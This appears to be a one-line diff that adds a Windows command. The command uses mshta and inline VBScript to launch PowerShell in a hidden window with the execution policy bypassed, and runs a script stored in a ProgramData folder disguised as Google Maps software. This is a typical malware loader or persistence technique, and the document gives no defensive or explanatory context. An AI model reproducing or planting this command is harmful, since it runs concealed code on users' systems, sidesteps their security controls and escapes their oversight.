@@ -1,0 +1,1 @@
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").rUn ""powershell -ExecutionPolicy Bypass & 'C:\ProgramData\Google\Maps\Wish.ps1'"", 0:close")
